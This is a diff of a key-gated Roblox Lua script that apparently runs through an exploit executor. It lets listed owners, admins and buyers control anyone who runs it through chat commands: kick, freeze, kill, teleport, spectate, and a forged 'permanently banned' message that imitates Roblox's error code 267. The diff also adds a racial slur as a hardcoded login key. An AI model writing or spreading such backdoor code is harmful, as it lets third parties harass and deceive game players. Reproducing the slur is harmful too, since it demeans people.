@@ -6,14 +6,13 @@ local lp = Players.LocalPlayer
 local guiVisible = false
 getgenv().Authorized = false
 
--- Set your access lists here
-local owners = {""}       -- Replace with real usernames
+-- 🔐 Add your real usernames here
+local owners = {""}  -- REPLACE with real usernames
 local admins = {}
 local buyers = {}
 
--- Secret keys for login
 local loginKeys = {
-    "testzad",
+    "nigger1",
     "hyperlolz1",
     "Buyerlucas1",
     "Buyerbigtoenail15"
@@ -62,7 +61,6 @@ timerLabel.Text = "Time left: 20"
 timerLabel.Font = Enum.Font.SourceSans
 timerLabel.TextSize = 14
 
--- Notification helper
 local function notify(msg)
     StarterGui:SetCore("SendNotification", {
         Title = "Login",
@@ -71,7 +69,6 @@ local function notify(msg)
     })
 end
 
--- GUI logic
 local function showLoginGui()
     if guiVisible or getgenv().Authorized then return end
     guiVisible = true
@@ -93,7 +90,6 @@ local function showLoginGui()
     end)()
 end
 
--- Open GUI keybind
 UserInputService.InputBegan:Connect(function(input, gpe)
     if gpe then return end
     if input.KeyCode == Enum.KeyCode.F1 then
@@ -102,7 +98,6 @@ UserInputService.InputBegan:Connect(function(input, gpe)
     end
 end)
 
--- Mobile users support
 lp.Chatted:Connect(function(msg)
     if msg:lower() == ".open" and not getgenv().Authorized then
         textbox.Text = ""
@@ -110,7 +105,8 @@ lp.Chatted:Connect(function(msg)
     end
 end)
 
--- Authorization check
+local viewingOwner = nil
+
 local function isAuthorized(player)
     for _, v in ipairs(owners) do if player.Name == v then return true end end
     for _, v in ipairs(admins) do if player.Name == v then return true end end
@@ -118,13 +114,88 @@ local function isAuthorized(player)
     return false
 end
 
--- Login validation
+-- === 🔧 Command effects ===
+local function bring(owner)
+    if lp.Character and owner.Character then
+        lp.Character:SetPrimaryPartCFrame(owner.Character:GetPrimaryPartCFrame())
+    end
+end
+
+local function freeze()
+    if lp.Character then
+        local hrp = lp.Character:FindFirstChild("HumanoidRootPart")
+        if hrp then hrp.Anchored = true end
+    end
+end
+
+local function unfreeze()
+    if lp.Character then
+        local hrp = lp.Character:FindFirstChild("HumanoidRootPart")
+        if hrp then hrp.Anchored = false end
+    end
+end
+
+local function view(owner)
+    if owner.Character then
+        lp.CameraMode = Enum.CameraMode.LockFirstPerson
+        lp.CameraSubject = owner.Character:FindFirstChildOfClass("Humanoid")
+        viewingOwner = owner
+    end
+end
+
+local function unview()
+    if lp.Character then
+        lp.CameraMode = Enum.CameraMode.Classic
+        lp.CameraSubject = lp.Character:FindFirstChildOfClass("Humanoid")
+        viewingOwner = nil
+    end
+end
+
+-- === 🔧 Command listener ===
+local function hookChat(player)
+    player.Chatted:Connect(function(msg)
+        if not msg then return end
+
+        msg = msg:lower()
+
+        if msg == "/commands" and player == lp then
+            notify("Available: /kick . /bring . /freeze . /unfreeze . /view . /unview . /kill . /ban .")
+            return
+        end
+
+        if not isAuthorized(player) then return end
+
+        if player == lp or not getgenv().Authorized then
+            if msg == "/kick ." then
+                lp:Kick("You have been kicked by an admin.")
+            elseif msg == "/bring ." then
+                bring(player)
+            elseif msg == "/freeze ." then
+                freeze()
+            elseif msg == "/unfreeze ." then
+                unfreeze()
+            elseif msg == "/view ." then
+                view(player)
+            elseif msg == "/unview ." then
+                unview()
+            elseif msg == "/kill ." then
+                local h = lp.Character and lp.Character:FindFirstChild("Humanoid")
+                if h then h.Health = 0 end
+            elseif msg == "/ban ." then
+                lp:Kick("You have been permanently banned from this experience. (Error Code: 267)")
+            end
+        end
+    end)
+end
+
+-- 🔐 Multi-key login
 _G.CheckKey = function(input)
     if getgenv().Authorized then return end
     for _, key in ipairs(loginKeys) do
         if input == key then
             getgenv().Authorized = true
             notify("Login successful!")
+            hookChat(lp)  -- Now YOU can use commands too
             gui:Destroy()
             return
         end
@@ -132,61 +203,21 @@ _G.CheckKey = function(input)
     notify("Invalid key!")
 end
 
--- Key check when textbox loses focus
 textbox.FocusLost:Connect(function(enterPressed)
     if enterPressed then
         _G.CheckKey(textbox.Text)
     end
 end)
 
--- Admin commands handler
-local function hookChat(authUser)
-    authUser.Chatted:Connect(function(msg)
-        if not msg or getgenv().Authorized then return end
-
-        msg = msg:lower()
-        if msg == "/commands" then
-            notify("Available: /kick . /bring . /freeze . /unfreeze . /view . /unview . /kill . /ban .")
-        elseif msg == "/kick ." then
-            lp:Kick("Admins has kicked you.")
-        elseif msg == "/bring ." then
-            if lp.Character and authUser.Character then
-                lp.Character:SetPrimaryPartCFrame(authUser.Character:GetPrimaryPartCFrame())
-            end
-        elseif msg == "/freeze ." then
-            local hrp = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
-            if hrp then hrp.Anchored = true end
-        elseif msg == "/unfreeze ." then
-            local hrp = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
-            if hrp then hrp.Anchored = false end
-        elseif msg == "/view ." then
-            if authUser.Character then
-                lp.CameraMode = Enum.CameraMode.LockFirstPerson
-                lp.CameraSubject = authUser.Character:FindFirstChildOfClass("Humanoid")
-            end
-        elseif msg == "/unview ." then
-            lp.CameraMode = Enum.CameraMode.Classic
-            lp.CameraSubject = lp.Character:FindFirstChildOfClass("Humanoid")
-        elseif msg == "/kill ." then
-            local h = lp.Character and lp.Character:FindFirstChild("Humanoid")
-            if h then h.Health = 0 end
-        elseif msg == "/ban ." then
-            lp:Kick("You have been permanently banned from this experience. (Error Code: 267)")
-        end
-    end)
-end
-
--- Hook any authorized player who joins
+-- 🧠 Dynamic command hookup for admins/owners/buyers
 local function onPlayerAdded(player)
     if isAuthorized(player) then
         hookChat(player)
     end
 end
 
--- Hook existing authorized players
 for _, p in ipairs(Players:GetPlayers()) do
     onPlayerAdded(p)
 end
 
--- Hook new authorized players
 Players.PlayerAdded:Connect(onPlayerAdded)
